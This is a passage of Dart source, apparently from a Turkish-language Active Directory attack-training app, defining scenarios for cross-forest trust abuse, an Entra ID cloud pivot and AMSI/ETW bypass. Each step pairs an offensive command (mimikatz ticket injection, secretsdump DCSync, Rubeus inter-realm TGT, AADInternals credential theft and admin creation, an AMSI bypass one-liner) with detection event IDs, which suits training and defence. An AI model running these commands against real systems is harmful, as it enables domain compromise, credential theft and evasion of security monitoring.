        detection: 'Event ID 4768, Event ID 4672 (Enterprise Admins privileges assigned via cross-realm ticket).',
      ),
      ScenarioStep(
        stepNumber: 4,
        title: 'Root Domain DC\'sine Bağlanma ve Ele Geçirme',
        tactic: 'Lateral Movement & Dominance',
        description: r"Enjekte edilen bilet ile orman kökü DC'nin C$ paylaşımına tam yetkiyle erişilir.",
        tool: 'mimikatz / dir',
        command: r'mimikatz # kerberos::ptt trust_golden.kirbi && dir \\root-dc.rootdomain.local\C$',
        detection: 'Event ID 4624 (Logon Type 3, Kerberos Cross-Domain Authenticated).',
      ),
    ],
  ),

  // 33. Cross-Forest Trust Bilet İletimi
  AttackScenario(
    id: 'sc_cross_forest_trust',
    title: 'İki Yönlü Orman Güveninde TGT İletimi ve Yanal Yayılma',
    difficulty: 'İleri Seviye',
    category: 'Trust & Hibrit',
    description: 'Dış güven (External Trust) veya Orman Güveni (Forest Trust) tanımlı iki etki alanı arasında Kerberos bilet yönlendirmesi ile diğer forest\'taki kaynakları ele geçirme.',
    tags: ['Cross-Forest', 'Kerberos Inter-Realm', 'Trust Abuse', 'Rubeus asktgt'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Güven Anahtarını (Trust Key) Çıkarma',
        tactic: 'Credential Access',
        description: 'İki etki alanı arasındaki güven ilişkisini şifreleyen Trust Account NT hash\'i DCSync ile alınır.',
        tool: 'secretsdump.py',
        command: r'python3 secretsdump.py -just-dc-user "TARGET_FOREST$" domain.local/admin:pass@192.168.1.10',
        detection: 'Event ID 4662 (DCSync).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Inter-Realm TGT Üretme',
        tactic: 'Lateral Movement',
        description: 'Trust key ile imzalanmış çapraz etki alanı TGT bileti basılır.',
        tool: 'Rubeus asktgt',
        command: r'Rubeus.exe asktgt /user:Administrator /domain:domain.local /rc4:<TRUST_KEY> /targetdomain:target.forest.local /ticket:interrealm.kirbi',
        detection: 'Event ID 4769 (Service ticket requested for inter-realm trust account).',
      ),
    ],
  ),

  // 34. Entra ID / Bulut Hibrit Pivot
  AttackScenario(
    id: 'sc_entra_id_cloud_pivot',
    title: 'Hibrit Ortamda Şirket İçi AD\'den Entra ID (Azure AD Connect) Bulutuna Pivot',
    difficulty: 'İleri Seviye',
    category: 'Trust & Hibrit',
    description: 'Şirket içi etki alanında çalışan Microsoft Entra Connect (eski adıyla Azure AD Connect) sunucusundaki MSOL_ servis hesabının şifresini çözerek Office 365 / Azure bulut kiracısına sıçrama.',
    tags: ['Entra ID', 'Azure AD Connect', 'Cloud Pivot', 'AADInternals', 'MSOL'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Azure AD Connect Veritabanından Şifreli Anahtarları Çıkarma',
        tactic: 'Credential Access',
        description: 'Yerel ADSync veritabanından (SQL LocalDB) bulut eşitleme servis hesabının kimlik bilgileri çekilir.',
        tool: 'AADInternals / PowerShell',
        command: r'Import-Module AADInternals; Get-AADIntSyncCredentials',
        detection: 'Sysmon Event ID 1 (SQL LocalDB üzerinde olağandışı sorgu), Event ID 4688.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Bulut Kiracısında Global Administrator Yetkisine Yükselme',
        tactic: 'Lateral Movement & Cloud Privilege Escalation',
        description: 'Elde edilen senkronizasyon yetkisi ile bulutta On-Premises Directory Synchronization Service yetkisi taklit edilir.',
        tool: 'AADInternals',
        command: r'New-AADIntUser -UserPrincipalName eviladmin@company.onmicrosoft.com -Role "Global Administrator"',
        detection: 'Entra ID Audit Log: User created by Directory Sync Service with administrative role.',
      ),
    ],
  ),

  // 35. Savunma Atlatma: AMSI ve ETW Yama Zinciri
  AttackScenario(
    id: 'sc_amsi_etw_bypass',
    title: 'Savunma Atlatma: Bellek İçi AMSI ve ETW Yama Zinciri (EDR Bypass)',
    difficulty: 'İleri Seviye',
    category: 'Savunma Atlatma',
    description: 'PowerShell veya C# payload\'ları çalıştırmadan önce amsi.dll içindeki AmsiScanBuffer ve ntdll.dll içindeki EtwEventWrite fonksiyonlarını bellek üzerinde yamalayarak (patching) EDR/AV alarmlarını susturma.',
    tags: ['AMSI Bypass', 'ETW Patching', 'Defense Evasion', 'EDR Bypass', 'Memory Patch'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'AmsiScanBuffer Fonksiyonunu Bellekte Yamalama',
        tactic: 'Defense Evasion',
        description: 'amsi.dll hafızasına 0x31, 0xC0, 0xC3 (xor eax, eax; ret) baytları yazılarak taramanın her zaman AMSI_RESULT_CLEAN dönmesi sağlanır.',
        tool: 'PowerShell Byte Patch',
        command: r'[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        detection: 'Bellek koruma değişiklikleri: VirtualProtect PAGE_EXECUTE_READWRITE çağrısı.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'ETW (Event Tracing for Windows) Kaydını Susturma',
        tactic: 'Defense Evasion',
        description: 'ntdll!EtwEventWrite fonksiyonuna RET (0xC3) yazılarak EDR ve Sysmon\'a telemetri gönderilmesi engellenir.',
        tool: 'Patch-ETW',
        command: r'# Bellekte ntdll!EtwEventWrite üzerine anlık 0xC3 (RET) baytı yazılır',
        detection: 'Kernel seviyesinde ETW sensör uyumsuzluk logları.',
      ),
    ],
  ),
];
